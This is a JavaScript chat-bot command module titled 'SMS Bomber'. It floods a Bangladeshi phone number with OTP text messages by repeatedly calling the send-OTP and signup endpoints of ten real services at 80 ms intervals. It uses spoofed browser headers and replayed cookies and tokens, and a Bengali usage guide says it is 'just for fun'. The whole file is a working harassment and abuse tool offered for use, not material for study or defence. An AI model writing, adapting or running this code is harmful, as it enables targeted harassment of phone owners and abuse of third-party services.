const axios = require("axios");

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const activeBombings = {}; // Track all active bombings with their progress messages

module.exports = {
  config: {
    name: "bombsms",
    version: "3.0.0",
    author: "OMOR TE",
    countDown: 0,
    role: 2,
    shortDescription: "SMS Bomber",
    longDescription: "SMS bombing tool - Multiple numbers supported",
    guide: "{p}bombsms 01xxxxxxxxx limit | {p}bombsms off",
    category: "tool"
  },

  onStart: async function ({ message, event, args, api }) {
    const threadID = event.threadID;
    
    // GLOBAL OFF - সব বন্ধ করবে
    if (args[0] === "off") {
      let count = 0;
      for (const key in activeBombings) {
        if (activeBombings[key].active === true) {
          activeBombings[key].active = false;
          count++;
          // Update progress message to stopped
          try {
            await api.editMessage(
              `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${activeBombings[key].number}\n📊 ${activeBombings[key].sent}/${activeBombings[key].limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
              activeBombings[key].messageID
            );
          } catch(e) {}
        }
      }
      if (count > 0) {
        return message.reply(`✅ **${count}** টি বোম্বিং বন্ধ করা হয়েছে।`);
      } else {
        return message.reply("❗ কোনো বোম্বিং চলছিল না।");
      }
    }

    const num = args[0];
    const limitInput = args[1];
    
    if (!num || !limitInput) {
      return message.reply(`📱 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📌 ব্যবহার: bombsms 01xxxxxxxxx 50\n📌 একাধিক: প্রতিটি কমান্ড আলাদাভাবে\n📌 বন্ধ: bombsms off (সব বন্ধ হবে)\n━━━━━━━━━━━━━━━━━━━━\n⚠️ শুধু মজার জন্য ব্যবহার করুন`);
    }
    
    if (!/^01[0-9]{9}$/.test(num)) {
      return message.reply("❌ সঠিক বাংলাদেশি নাম্বার দিন (01xxxxxxxxx)");
    }
    
    const limit = parseInt(limitInput);
    if (isNaN(limit) || limit <= 0) {
      return message.reply("❌ সঠিক সংখ্যা দিন (যেমন: 50)");
    }
    
    // Unique ID for this bombing session
    const sessionId = `${Date.now()}_${num}`;
    
    // Send start message with 0%
    const progressBar0 = getProgressBar(0, 20);
    const progressMsg = await message.reply(`🚀 **SMS BOMBER #${Object.keys(activeBombings).length + 1}**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n${progressBar0}\n━━━━━━━━━━━━━━━━━━━━\n⚡ ফাস্ট মোড\n⏳ শুরু হচ্ছে...`);
    
    // Store bombing info
    activeBombings[sessionId] = {
      active: true,
      number: num,
      limit: limit,
      sent: 0,
      messageID: progressMsg.messageID,
      threadID: threadID
    };
    
    let sent = 0;
    let consecutiveFailures = 0;
    let lastUpdatePercent = -1; // Start at -1 so 0% will update

    // API configs
    const headers = {
      'authority': 'www.bioscopelive.com',
      'accept': '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.bioscopelive.com/en/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
    };
    
    const url1 = `https://www.bioscopelive.com/en/login/send-otp?phone=880${num}&operator=bd-otp`;
    
    const headers2 = {
      'referer': 'https://redx.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data1 = {
      'name': num,
      'phoneNumber': num,
      'service': 'redx',
    };
    
    const url2 = "https://api.redx.com.bd/v1/user/signup";
    
    const headers3 = {
      'authority': 'bikroy.com',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'bn',
      'application-name': 'web',
      'referer': 'https://bikroy.com/bn/users/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url3 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0" + num;
    
    const headers4 = {
      'authority': 'www.ieatery.com.bd',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.ieatery.com.bd/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const url4 = "https://www.ieatery.com.bd/otp-verify?phn=0" + num;
    
    const headers5 = {
      'referer': 'https://doctime.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data2 = {
      'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
      'code': '88',
      'contact_no': '0' + num,
      'country_calling_code': '88',
    };
    
    const headers6 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data3 = {
      'mobile': '+88-0' + num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
    };
    
    const headers7 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const data4 = {
      'mobile': '+88-0' + num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
    };
    
    const headers8 = {
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https://hungrynaki.com',
      'Referer': 'https://hungrynaki.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'accept': '*/*',
      'content-type': 'application/json',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
    };
    
    const data8 = {
      'operationName': 'createOtp',
      'variables': {
        'phone': "" + num,
        'country': '880',
        'uuid': '6fdb595b-a310-4f82-acca-a9b9c43e4eb0',
        'osVersionCode': 'Linux aarch64',
        'deviceBrand': 'Chrome',
        'deviceModel': '107',
        'requestFrom': 'U2FsdGVkX19u2nkZ5KMkGtpye/A3kpZfWKv3ylKExbM=',
      },
      'query': 'mutation createOtp($phone: PhoneNumber!, $country: String!, $uuid: String!, $osVersionCode: String, $deviceBrand: String, $deviceModel: String, $requestFrom: String) {\n  createOtp(auth: {phone: $phone, countryCode: $country, deviceUuid: $uuid, deviceToken: ""}, device: {deviceType: WEB, osVersionCode: $osVersionCode, deviceBrand: $deviceBrand, deviceModel: $deviceModel}, requestFrom: $requestFrom) {\n    statusCode\n  }\n}\n',
    };
    
    const cookies9 = {
      '_ga': 'GA1.3.1671188319.1677642641',
      '_gid': 'GA1.3.407134519.1677642641',
      '_gat_UA-146796176-2': '1',
      '_fbp': 'fb.2.1677642641903.2005162471',
      '_ga_5LF4359FD3': 'GS1.1.1677642640.1.1.1677642660.0.0.0',
    };
    
    const headers9 = {
      'authority': 'fundesh.com.bd',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'content-type': 'application/json; charset=UTF-8',
      'origin': 'https://fundesh.com.bd',
      'referer': 'https://fundesh.com.bd/fundesh/profile',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    };
    
    const params9 = {
      'service_key': '',
    };
    
    const json_data9 = {
      'msisdn': '' + num,
    };
    
    const headers10 = {
      'Accept': '*/*',
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https://ecourier.com.bd',
      'Referer': 'https://ecourier.com.bd/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
    };
    
    const url10 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=0" + num;
    
    const cookieString = Object.entries(cookies9).map(([key, value]) => `${key}=${value}`).join('; ');
    
    const apiCalls = [
      async () => await axios.get(url1, { headers: headers }),
      async () => await axios.post(url2, data1, { headers: headers2 }),
      async () => await axios.get(url3, { headers: headers3 }),
      async () => await axios.get(url4, { headers: headers4 }),
      async () => await axios.post('https://admin.doctime.com.bd/api/authenticate', data2, { headers: headers5 }),
      async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data3, { headers: headers6 }),
      async () => await axios.post('https://api.osudpotro.com/api/v1/users/send_otp', data4, { headers: headers7 }),
      async () => await axios.post('https://api-v4-1.hungrynaki.com/graphql', data8, { headers: headers8 }),
      async () => await axios.post('https://fundesh.com.bd/api/auth/generateOTP', json_data9, {
        headers: { ...headers9, 'Cookie': cookieString },
        params: params9
      }),
      async () => await axios.get(url10, { headers: headers10 })
    ];
    
    // FAST BOMBING LOOP
    (async () => {
      while (sent < limit && activeBombings[sessionId]?.active === true) {
        let cycleSuccess = false;
        
        for (let i = 0; i < apiCalls.length && sent < limit && activeBombings[sessionId]?.active === true; i++) {
          try {
            const response = await apiCalls[i]();
            if (response && (response.status === 200 || response.status === 201)) {
              sent++;
              cycleSuccess = true;
              consecutiveFailures = 0;
              
              // Update activeBombings
              if (activeBombings[sessionId]) {
                activeBombings[sessionId].sent = sent;
              }
              
              // Calculate percentage
              const newPercent = Math.floor((sent / limit) * 100);
              
              // Update progress at 0%, 1%, 25%, 50%, 75%, 100%
              if (newPercent !== lastUpdatePercent && (newPercent === 0 || newPercent === 1 || newPercent === 25 || newPercent === 50 || newPercent === 75 || newPercent === 100 || sent === limit)) {
                lastUpdatePercent = newPercent;
                const progressBar = getProgressBar(newPercent, 20);
                const activeCount = Object.keys(activeBombings).length;
                
                let statusText = "";
                if (sent >= limit) {
                  statusText = "✅ সম্পন্ন!";
                } else if (newPercent === 0) {
                  statusText = "⏳ শুরু হচ্ছে...";
                } else {
                  statusText = "⚡ ফাস্ট মোড";
                }
                
                try {
                  await api.editMessage(
                    `🚀 **SMS BOMBER #${activeCount}**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${newPercent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n${statusText}`,
                    progressMsg.messageID
                  );
                } catch(e) {}
              }
            }
          } catch (error) {
            consecutiveFailures++;
          }
          
          // Super fast: 80ms delay
          await sleep(80);
          
          if (!activeBombings[sessionId]?.active) break;
        }
        
        if (!cycleSuccess) {
          consecutiveFailures++;
          await sleep(300);
        }
        
        if (consecutiveFailures > 60) {
          try {
            await api.editMessage(
              `⚠️ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit reached\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━`,
              progressMsg.messageID
            );
          } catch(e) {}
          break;
        }
        
        await sleep(150);
      }
      
      // Cleanup
      if (activeBombings[sessionId]) {
        delete activeBombings[sessionId];
      }
    })();
  }
};

function getProgressBar(percent, width) {
  const filled = Math.round((percent / 100) * width);
  const empty = width - filled;
  return `┣${"█".repeat(filled)}${"░".repeat(empty)}┫`;
}
